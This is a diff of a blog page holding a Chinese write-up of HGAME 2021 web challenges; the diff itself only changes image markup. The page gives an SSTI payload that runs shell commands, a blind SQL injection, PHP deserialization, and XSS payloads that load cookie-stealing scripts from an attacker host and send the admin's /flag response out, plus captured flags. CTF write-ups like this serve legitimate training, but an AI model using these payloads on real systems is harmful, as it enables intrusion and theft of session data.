@@ -89,10 +89,7 @@
 			
 			pangu: "false",
 			
-				lazyload: {
-					threshold: 800,
-					effect: "fadeIn"
-				},
+				lazyload: false,
 			
 			disable_pjax: false,
 			headroom: false
@@ -665,11 +662,9 @@
 
 	<div class="post-content" id="post_content">
 		<h2 id="Level-Week3"><a href="#Level-Week3" class="headerlink" title="Level - Week3"></a>Level - Week3</h2><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><p>考点：简单python-SSTI</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230828.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230828.png" alt="img"></p>
 <p>题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230954.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210214230953251"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230954.png" alt="image-20210214230953251"></p>
 <p>最为常规的payload：</p>
 <pre><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()&#125;&#125;
 &#123;&#123;[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()&#125;&#125;
@@ -696,20 +691,17 @@ for i in range(0, len(list)):
 </code></pre>
 <h3 id="iki-Jail"><a href="#iki-Jail" class="headerlink" title="iki-Jail"></a>iki-Jail</h3><p>考点：MySQL注入，单引号逃逸</p>
 <p>熟悉的登录框，熟悉的sql注入</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130850.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210215130849132"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130850.png" alt="image-20210215130849132"></p>
 <p>发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。</p>
 <p>于是直接使用bp对<code>login.php</code>发包；</p>
 <p>进行了简单的fuzz，过滤如下：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131112.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210215131110567"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131112.png" alt="image-20210215131110567"></p>
 <p>由单双引号过滤想到了<code>\</code>逃逸单引号，当我们用户名输入<code>admin\</code>的时候，语句变成了：</p>
 <pre><code class="sql">SELECT * FROM user WHERE username=&#39;admin\&#39; AND password=&#39;xxx&#39;
 </code></pre>
 <p>那么<code>xxx</code>就变成了sql语句执行，造成了注入；</p>
 <p>结果发现只能延时注入：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131035.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210215131033385"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131035.png" alt="image-20210215131033385"></p>
 <p>exp：</p>
 <pre><code class="python">#python3,wh1sper
 import requests
@@ -764,8 +756,7 @@ if __name__ == &#39;__main__&#39;:
 </code></pre>
 <p>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</p>
 <h3 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h3><p>考点：PHP反序列化</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215121944.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210215121933780"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215121944.png" alt="image-20210215121933780"></p>
 <p>题目是一个类似于抽卡的网站，描述里面说”r4u用git部署到了自己的服务器上”，那么自然而然Githack把源码hack下来。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip">source.zip</a></p>
 <p>在<code>simulator.php</code>我们可以看到有很多类，其中第146行</p>
@@ -843,17 +834,14 @@ if($sign === md5($data . $key))&#123;
 */
 </code></pre>
 <p>发送session即可得到flag</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130724.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210215130722662"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130724.png" alt="image-20210215130722662"></p>
 <h3 id="Post-to-zuckonit2-0"><a href="#Post-to-zuckonit2-0" class="headerlink" title="Post to zuckonit2.0"></a>Post to zuckonit2.0</h3><p>考点：XSS</p>
 <p>网站是一个创建笔记的站点，存在XSS漏洞</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216130625.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210216130624020"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216130625.png" alt="image-20210216130624020"></p>
 <p>在<code>/static/www.zip</code>给了源码：<a target="_blank" rel="noopener" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip">source.zip</a></p>
 <p>和week2的XSS比起来多一个功能，可以替换批量字符串，并且在<code>/preview</code>查看替换的结果</p>
 <p>审计源码，在添加留言的存在一个waf：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216125153.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210216125152416"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216125153.png" alt="image-20210216125152416"></p>
 <p>跟进函数：</p>
 <pre><code class="python">def escape_index(original):
     content = original
@@ -866,38 +854,31 @@ if($sign === md5($data . $key))&#123;
 </code></pre>
 <p>可以看到只允许我们添加类似于<code>&lt;iframe scr=&quot;xxx&quot;&gt;</code>的标签，并且<code>xxx</code>限制在1-8位，显然没办法直接执行JS。</p>
 <p>不过我们可以添加<code>&lt;iframe scr=&quot;/preview &quot;&gt;</code>来使得index能直接看到<code>/preview</code>页面：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124755.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210216124754639"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124755.png" alt="image-20210216124754639"></p>
 <p>再通过字符串替换功能，把<code>xxx</code>换成<code>javascript:xxxxx</code>，形成<code>&lt;iframe src=&#39;javascript:alter(1)&#39;&gt;</code>即可XSS</p>
 <p>payload：</p>
 <pre><code class="js">javascript:document.write(atob(&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+&#39;));
 </code></pre>
 <p>小手一抖，cookie到手：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124700.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210216124651414"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124700.png" alt="image-20210216124651414"></p>
 <p>hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function}</p>
 <h3 id="Post-to-zuckonit-another-version"><a href="#Post-to-zuckonit-another-version" class="headerlink" title="Post to zuckonit another version"></a>Post to zuckonit another version</h3><p>考点：XSS，HttpOnly绕过</p>
 <p>说是绕<code>HttpOnly</code>，实则并没有绕；</p>
 <p>相比于上一道XSS：</p>
 <ol>
 <li><p>增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173620.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220173619352"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173620.png" alt="image-20210220173619352"></p>
 </li>
 <li><p>修改了功能，把直接替换字符串换成了查找字符串</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173858.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220173856459"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173858.png" alt="image-20210220173856459"></p>
 </li>
 </ol>
 <p>依然在<code>static/www.zip</code>给出了源码：<a target="_blank" rel="noopener" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip">source.zip</a></p>
 <p>源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加<code>&lt;b&gt;</code>标签，得到高亮效果</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174349.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220174348492"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174349.png" alt="image-20210220174348492"></p>
 <p>如果按照正常思维来查找’a’字符串的话，效果就如下图：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174512.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220174510622"></p>
-
-<p>但是我们应当注意到，这个高亮实际上还是由<code>String.prototype.replace()</code>方法来进行<strong>正则替换</strong>的，那么我们如果输入<code>.*</code>之类的关键词进行高亮就会出现意想不到的效果：<br><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174753.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220174752450"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174512.png" alt="image-20210220174510622"></p>
+<p>但是我们应当注意到，这个高亮实际上还是由<code>String.prototype.replace()</code>方法来进行<strong>正则替换</strong>的，那么我们如果输入<code>.*</code>之类的关键词进行高亮就会出现意想不到的效果：<br><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174753.png" alt="image-20210220174752450"></p>
 <p>没错，因为正则替换让我们得以有机可乘</p>
 <p>思路还是一样，先利用替换构造好XSS，再利用<code>&lt;iframe src=&#39;/preview&#39;&gt;</code>来触发0-click</p>
 <p>payload：</p>
@@ -908,8 +889,7 @@ if($sign === md5($data . $key))&#123;
 <pre><code>AAA(&#39;srcdoc=&#39;&amp;lt;img src=1 onerror=document.write(atob(&amp;#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&amp;#x27;));&amp;gt;&#39;)*
 </code></pre>
 <p>替换之后其实是这样：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175915.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220175913943"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175915.png" alt="image-20210220175913943"></p>
 <p>实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过</p>
 <pre><code>&lt;iframe src=&quot;&lt;b class=&amp;quot;search_result&amp;quot;&gt;AAA(&quot; srcdoc=&quot;&lt;img src=1 onerror=document.write(atob(&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&#39;));&gt;&quot; )*&lt;=&quot;&quot; b=&quot;&quot;&gt;&#39; &gt;&lt;/iframe&gt;
 </code></pre>
@@ -937,17 +917,13 @@ xmlhttp.send(&#39;&#39;);
 </code></pre>
 <p>不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求<code>/flag</code>，把responseText发给我们就行了；</p>
 <p>这个是本地打的结果：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220172735.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220172727362"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220172735.png" alt="image-20210220172727362"></p>
 <p>大手一抖，flag到手：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175431.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220175430475"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175431.png" alt="image-20210220175430475"></p>
 <p>因为flag里面出题人故意放了<code>&amp;</code>字符让我们踩坑，打出来的responseText需要base64编码。</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175441.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220172930232"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175441.png" alt="image-20210220172930232"></p>
 <p>下面这个才对。</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175445.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20210220173313149"></p>
-
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175445.png" alt="image-20210220173313149"></p>
 
 	</div>
 
